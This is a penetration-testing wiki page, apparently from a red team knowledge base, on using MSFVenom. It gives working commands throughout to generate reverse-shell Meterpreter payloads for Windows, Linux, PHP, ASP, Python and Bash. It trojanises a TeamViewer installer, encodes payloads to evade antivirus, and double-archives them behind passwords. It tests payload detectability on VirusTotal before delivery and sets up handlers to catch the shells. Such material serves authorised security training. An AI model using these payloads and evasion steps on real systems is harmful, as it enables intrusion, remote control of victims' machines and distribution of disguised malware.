---
title: "MSFVenom"
category: "tools"
tags: []
excerpt: "MSFVenom is the standalone Metasploit payload generator and encoder. It combines the functionality of the older  and..."
date: "2026-04-12"
---

---
## Overview
MSFVenom is the standalone Metasploit payload generator and encoder. It combines the functionality of the older `msfpayload` and `msfencode` tools into a single command. MSFVenom generates shellcode, executables, scripts, and other payload formats for delivery outside of MSFConsole — used when you need to drop a file on the target, upload a web shell, or deliver a payload through a non-Metasploit vector. After deploying the payload, a handler must be set up in MSFConsole to catch the incoming connection.

## Target / Context
Used when a payload needs to be generated as a file or raw shellcode for external delivery. Pairs with `exploit/multi/handler` in [MSFConsole](/tools/Frameworks/Metasploit/MSFConsole) to catch the reverse connection. Part of the [Metasploit](/tools/Frameworks/Metasploit/Metasploit) framework.

---
## Installation

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Installation Commands:</span></summary>
<div class="callout-body">

MSFVenom is installed as part of Metasploit Framework:
<ul class="callout-list">
  <li><code>sudo apt install metasploit-framework</code></li>
</ul>
Verify: <code>msfvenom --version</code>

</div>
</details>

---
## Basic Usage

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Basic Usage:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>msfvenom -p <payload> LHOST=<IP> LPORT=<PORT> -f <format> > output_file</code></li>
</ul>

List available payloads: <code>msfvenom -l payloads</code>
List available formats: <code>msfvenom --list formats</code>
Filter payloads by keyword: <code>msfvenom --list payloads | grep meterpreter</code>
List available encoders: <code>msfvenom --list encoders</code>

</div>
</details>

---
## Flags & Options

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Flags & Options:</span></summary>
<div class="callout-body">

| Flag | Description | Example |
|------|-------------|---------|
| <code>-p</code> | Payload to use | <code>-p windows/x64/meterpreter/reverse_tcp</code> |
| <code>LHOST</code> | Attacker IP address | <code>LHOST=10.10.10.5</code> |
| <code>LPORT</code> | Attacker listening port | <code>LPORT=4444</code> |
| <code>-f</code> | Output format | <code>-f exe</code> / <code>-f elf</code> / <code>-f raw</code> / <code>-f php</code> |
| <code>-e</code> | Encoder to apply | <code>-e x86/shikata_ga_nai</code> |
| <code>-i</code> | Number of encoding iterations | <code>-i 5</code> |
| <code>-o</code> | Output file (alternative to <code>></code> redirect) | <code>-o rev_shell.exe</code> |
| <code>-b</code> | Bad characters to avoid in shellcode | <code>-b "\x00\x0a\x0d"</code> |
| <code>-x</code> | Executable template to inject the payload into | <code>-x ~/Downloads/TeamViewer_Setup.exe</code> |
| <code>-k</code> | Keep original application running alongside the payload | <code>-k</code> |
| <code>-a</code> | Architecture override | <code>-a x86</code> |
| <code>--platform</code> | Platform override | <code>--platform windows</code> |
| <code>--list</code> | List available options (payloads, formats, encoders) | <code>--list payloads</code> |

</div>
</details>

---
## Common Use Cases

### Generating Platform-Specific Payloads

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Linux ELF:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f elf > rev_shell.elf</code></li>
</ul>

</div>
</details>

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Windows EXE:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f exe > rev_shell.exe</code></li>
</ul>

64-bit Windows:
<ul class="callout-list">
  <li><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f exe > rev_shell.exe</code></li>
</ul>

</div>
</details>

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Web Shells:</span></summary>
<div class="callout-body">

PHP: <code>msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=4444 -f raw > rev_shell.php</code>
ASP: <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f asp > rev_shell.asp</code>

PHP note: Remove PHP comments from the output and ensure the file ends with <code>?></code> before deploying.

</div>
</details>

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Script Payloads:</span></summary>
<div class="callout-body">

Python: <code>msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=4444 -f raw > rev_shell.py</code>
Bash: <code>msfvenom -p cmd/unix/reverse_bash LHOST=10.10.X.X LPORT=4444 -f raw > rev_shell.sh</code>

</div>
</details>

---

### Encoding Payloads
Encoders transform the payload to evade signature-based detection. Multiple encoding passes increase obfuscation but also increase payload size.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe > encoded_shell.exe</code></li>
</ul>

PHP with base64 encoding:
<ul class="callout-list">
  <li><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.5 -f raw -e php/base64</code></li>
</ul>

Common encoders:
<code>x86/shikata_ga_nai</code> — polymorphic XOR additive feedback encoder (most common)
<code>x64/xor</code> — 64-bit XOR encoder
<code>php/base64</code> — base64 encoding for PHP payloads

</div>
</details>

---

### Setting Up a Handler
After deploying a payload, launch a handler in MSFConsole to catch the incoming reverse connection.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>msfconsole</code></li>
  <li><code>use exploit/multi/handler</code></li>
  <li><code>set PAYLOAD <same payload used in msfvenom></code></li>
  <li><code>set LHOST <your IP></code></li>
  <li><code>set LPORT <your port></code></li>
  <li><code>exploit</code></li>
</ul>

Example for a PHP reverse shell:
<ul class="callout-list">
  <li><code>set PAYLOAD php/meterpreter/reverse_tcp</code></li>
  <li><code>set LHOST 10.0.2.19</code></li>
  <li><code>set LPORT 7777</code></li>
  <li><code>exploit</code></li>
</ul>

The handler waits for the payload to connect back. Once the target executes the payload file, the session opens in MSFConsole.
Run <code>exploit -z</code> to catch the session and immediately background it.

</div>
</details>

---

### Template Injection
Inject a payload into a legitimate executable so the malicious code is hidden inside real application code. Use `-k` to keep the original application running normally — this avoids raising suspicion if the target launches the file from a GUI.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=<attacker-ip> LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5</code></li>
</ul>

<code>-x</code> specifies the legitimate executable to use as a template.
<code>-k</code> causes the payload to spawn in a separate thread so the real application continues running.
<code>-i 5</code> applies 5 encoding passes — increases obfuscation but also file size.

Note: Even with encoding and templates, modern AV solutions detect most MSFVenom payloads. Template injection is more effective against older or signature-only AV. Test payloads with <code>msf-virustotal</code> before deployment.

</div>
</details>

---

### Archive Evasion
Placing a payload inside a password-protected archive bypasses many AV scanners that cannot inspect encrypted archives. Removing the file extension makes it less obvious. Double-archiving with separate passwords adds another layer.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

Install RAR utility:
<ul class="callout-list">
  <li><code>wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz</code></li>
  <li><code>tar -xzvf rarlinux-x64-612.tar.gz && cd rar</code></li>
</ul>

Generate payload:
<ul class="callout-list">
  <li><code>msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=<attacker-ip> LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5</code></li>
</ul>

Archive with password (first layer):
<ul class="callout-list">
  <li><code>rar a ~/test.rar -p ~/test.js</code></li>
  <li><code>mv test.rar test</code></li>
</ul>

Archive again (second layer):
<ul class="callout-list">
  <li><code>rar a test2.rar -p test</code></li>
  <li><code>mv test2.rar test2</code></li>
</ul>

Delivering a double-archived, password-protected payload with no extension significantly reduces automatic scanning coverage.

</div>
</details>

---

### Packers
Packers compress and wrap an executable so the payload is unpacked in memory at runtime, making static signature matching harder. The decompression stub is the only part visible on disk.

Common packers: UPX, The Enigma Protector, MPRESS, Alternate EXE Packer, ExeStealth, Morphine, MEW, Themida.

Note: Packers are effective against signature-based detection but may trigger heuristic detection due to the compression stub pattern. UPX in particular has well-known signatures in most AV databases.

---

### Testing Payloads with msf-virustotal
`msf-virustotal` is a Metasploit utility that submits a payload file to VirusTotal for detection testing against multiple AV engines. Requires a free VirusTotal API key.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>msf-virustotal -k <API-KEY> -f <payload-file></code></li>
</ul>

Use this to gauge how detectable a generated payload is before delivery. Highly detected payloads need additional obfuscation — more encoding passes, template injection, or manual payload modification.

Warning: Submitting to VirusTotal makes the payload public. Never submit payloads containing client-specific IPs or identifying information during a real engagement.

</div>
</details>

---
## Related Techniques
-

## Related Playbooks
- [Red Team](/playbooks/Methodologies/Red-Team)

---
## References / Images
- Working with Payloads: https://docs.rapid7.com/metasploit/working-with-payloads/
- Metasploit Unleashed: https://www.offsec.com/metasploit-unleashed/
- The Metasploit Book: https://nostarch.com/metasploit
